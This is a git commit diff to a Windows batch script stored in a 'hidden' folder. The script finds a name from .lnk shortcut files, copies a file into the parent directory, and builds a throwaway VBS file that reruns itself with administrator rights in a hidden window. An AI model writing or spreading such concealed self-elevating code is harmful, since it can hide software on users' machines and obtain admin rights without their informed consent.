25a2671447b1aedac15b33985ebc857ff791cae3
Oscar <56079903+OscarNOW@users.noreply.github.com>
2023-06-21 21:21:26 +0200

    Fixed bug

--- src/hidden/execute_3.bat
+++ src/hidden/execute_3.bat
@@ -1,5 +1,14 @@
-@echo off
+@REM @echo off
 SETLOCAL ENABLEDELAYEDEXPANSION
+
+for %%I in (.) do set hidden=%%~nxI
+
+cd ..
+for /R "%cd%" %%F in (*.lnk) do (
+    set name=%%~nxF
+    set name=!name:~0,-4!
+)
+cd !hidden!
 
 FOR /F %%i IN (options/admin) DO set admin=%%i
 
@@ -15,15 +24,6 @@ if 'z!admin!'=='ztrue' (
 )
 
 :continue
-
-for %%I in (.) do set hidden=%%~nxI
-
-cd ..
-for /R "%cd%" %%F in (*.lnk) do (
-    set name=%%~nxF
-    set name=!name:~0,-4!
-)
-cd !hidden!
 
 echo f | xcopy "!name!" "../!name!"
 
@@ -62,7 +62,7 @@ if %errorLevel% == 0 (
 
 :UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%temp2.vbs"
-    echo UAC.ShellExecute "cmd.exe", "/c ""%cd%\execute_1.bat"" %cd%", "", "runas", 0 >> "%temp%temp2.vbs"
+    echo UAC.ShellExecute "cmd.exe", "/c ""%cd%\!name:~0,-3!.!name:~-3!\!name!.bat"" %cd%", "", "runas", 0 >> "%temp%temp2.vbs"
 
     "%temp%temp2.vbs"
     del "%temp%temp2.vbs"
